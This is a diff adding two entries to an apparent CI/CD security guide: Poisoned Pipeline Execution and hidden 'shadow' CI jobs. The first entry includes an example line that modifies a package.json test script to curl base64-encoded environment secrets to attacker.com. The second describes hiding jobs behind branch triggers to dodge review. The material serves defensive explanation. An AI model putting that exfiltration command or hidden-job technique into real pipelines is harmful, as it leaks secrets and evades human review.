@@ -146,6 +146,13 @@ runs-on: self-hosted
 # Mitigation: self-hosted runners only for trusted private repos
 ```
 
+### [NEW] Poisoned Pipeline Execution (PPE)
+**How it works:** An attacker commits a malicious `Makefile`, `package.json` script, or a configuration file that the pipeline executes automatically.
+**Attack:** Modify `test` script in `package.json` to include `curl http://attacker.com/$(env | base64)`. The pipeline runs `npm test`, and the secrets are leaked.
+
+### [NEW] Shadow CI Jobs
+**How it works:** Malicious actors might add new, hidden jobs to a complex `.gitlab-ci.yml` or GitHub workflow that only trigger on specific conditions (like a specific branch name `feat/*-fix`) to avoid detection during normal PR reviews.
+
 ---
 
 ## 🧪 Static Analysis Script for Workflows
